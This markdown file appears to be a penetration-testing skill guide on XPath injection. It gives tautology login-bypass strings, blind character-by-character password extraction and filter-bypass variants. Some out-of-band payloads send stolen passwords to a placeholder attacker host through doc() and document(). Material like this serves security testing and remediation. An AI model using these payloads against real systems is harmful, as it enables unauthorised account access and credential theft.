---
name: xpath-injection
description: XPath injection testing against XML databases, LDAP-alternative queries, and XML-processing applications
---

# XPath Injection

XPath injection occurs when user input is embedded in XPath queries without sanitization, similar to SQL injection but targeting XML data stores. Common in legacy enterprise applications, SAML processors, document management systems, and any app using XML as a data store.

## Attack Surface

**Common Locations**
- XML-based authentication systems
- Document/configuration management with XML backends
- SAML assertion processing
- RSS/Atom feed parsers with user-controlled queries
- Reporting tools with XML data sources
- Legacy Java EE / .NET applications using XML databases (eXist-db, BaseX, MarkLogic)

**Input Vectors**
- Username/password fields feeding XPath auth queries
- Search/filter parameters
- API parameters querying XML documents
- URL path segments used in document navigation

## XPath Primer

```xpath
/users/user[name='alice']              # Select user by name
//user[@id='1']                        # Any user with id=1
/users/user[name='a' or '1'='1']      # Always true (tautology)
string(/users/user[1]/password)        # Extract first user's password
count(//user)                          # Count users
substring(string(//user[1]/pass),1,1) # First char of first user's password
```

## Key Vulnerabilities

### Authentication Bypass (Tautology)

```
# Vulnerable query:
/users/user[name='USERNAME' and password='PASSWORD']

# Injection in username:
' or '1'='1
# Result: /users/user[name='' or '1'='1' and password='X']
# Returns first user → logs in as that user

# More reliable:
' or 1=1 or 'a'='a
admin' or '1'='1
' or '1'='1' or 'x'='y
```

### Comment/Union Tricks

```
# XPath 1.0 has no comments, but:
' or '1'='1
'] | //user | //user['x'='x

# XPath 2.0:
' or true() or '
```

### Blind XPath Injection (Data Extraction)

When no error output or data reflection, use boolean-based:

```
# Test character by character:
' and substring(string(/users/user[1]/password),1,1)='a
# True → first char is 'a'
# False → try next char

# Or numeric comparison:
' and string-length(string(/users/user[1]/password))>5
' and string-to-codepoints(substring(string(//user[1]/password),1,1))>64
```

**Automated approach with OOB**
```
' and doc(concat('http://attacker/', string(//user[1]/password)))='x
```

### Full Document Extraction

```
# Count nodes
' or count(//*)>0 or '1'='2

# Get node names (blind enumeration)
' and name(//*)='user' or '1'='2

# Get all text content
' or string(//*[1])='' or 'a'='a

# XPath 2.0 string-join
' or string-join(//user/password, ':')='' or '1'='2
```

### Out-of-Band via doc() or document()

```xpath
' or doc('http://attacker.com/?x=' || string(//user[1]/password))
' or document(concat('http://attacker/', //user[1]/password))
```

### Namespace Tricks

```xpath
*:user   # Wildcard namespace
//q:user # Qualified name (if namespace declared)
```

## Bypass Techniques

**Quote Bypass**
```
# When single quotes filtered:
concat(char(39), 'admin', char(39))
concat("a","d","m","i","n")
# Double quotes:
" or "1"="1
```

**Operator Substitution**
```
not(0) = true
1=1    = true
normalize-space('x')='x'  # avoids simple string matching filters
```

**Function-Based Bypass**
```
' or starts-with(//user[1]/password,'a
' or contains(//user[1]/password,'admin
' or translate(//user[1]/name,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz')='admin
```

## Testing Methodology

1. **Inject meta characters** — `'`, `"`, `]`, `)`, `)` — look for errors
2. **Tautology test** — `' or '1'='1` in username/search fields
3. **Boolean discrimination** — Compare response with always-true vs always-false injection
4. **Error analysis** — XPath parse errors reveal query structure
5. **Blind extraction** — Use substring() + boolean comparison to extract data character by character
6. **OOB if available** — Try doc()/document() with attacker URL if HTTP outbound allowed

## Validation

1. Demonstrate authentication bypass by logging in without valid credentials
2. For blind injection, extract first character of a sensitive value (e.g., admin password)
3. Show the boolean discrimination technique with different responses for true/false conditions

## False Positives

- Parameterized XPath queries (using variables, not string concatenation)
- Input sanitization stripping XPath operators
- Application using XPath only on server-generated data, not user input

## Impact

- Authentication bypass → access to any account
- Full XML document data extraction
- Potential to extract secrets, credentials, private content stored in XML

## Pro Tips

1. XPath errors are verbose — enable error display in testing, they reveal query structure
2. XPath injection in SAML processors is particularly valuable (enterprise targets)
3. `xcat` is an automated XPath injection tool similar to sqlmap
4. XPath 2.0 has more functions for extraction; check which version is in use
5. `doc()` and `document()` are XPath SSRF — try for exfiltration AND internal access
6. Test LDAP and eXist-db queries separately — they have XPath interfaces with similar injection patterns

## Summary

XPath injection enables authentication bypass and data extraction from XML stores. Unlike SQL, XPath 1.0 has no comments or UNION, but tautology attacks and character-by-character blind extraction work universally. Parameterize XPath queries the same way you'd parameterize SQL.
